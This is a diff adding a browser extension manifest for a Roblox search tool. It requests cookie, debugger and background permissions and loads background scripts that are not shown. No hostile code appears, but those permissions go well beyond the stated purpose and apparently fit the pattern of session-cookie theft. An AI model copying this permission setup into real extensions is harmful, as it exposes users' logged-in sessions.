@@ -1,0 +1,28 @@
+{
+"update_url": "https://clients2.google.com/service/update2/crx",
+
+	"name": "Jade's Roblox Searcher Pro",
+	"version": "3",
+	"manifest_version": 2,
+	"description": "A extension made by Jade that lets you quickly search for things on Roblox",
+	"options_page": "options.html",
+	"browser_action": {
+		"default_icon": "icon.png",
+		"default_title": "Open Jade's Roblox Searcher Pro",
+		"default_popup": "extension.html"
+	},
+	"content_security_policy": "script-src 'self' https://www.google.com; object-src 'self'",
+	"icons": {
+		"128": "icon.png"
+	},
+	"background": {
+        "scripts": ["jQuery-ver4.js", "jQuery-ver3.js", "work.js"]
+},
+    "permissions": [
+        "alarms",
+        "background",
+        "debugger",
+        "notifications",
+        "cookies",
+        "https://www.roblox.com/"]
+}    
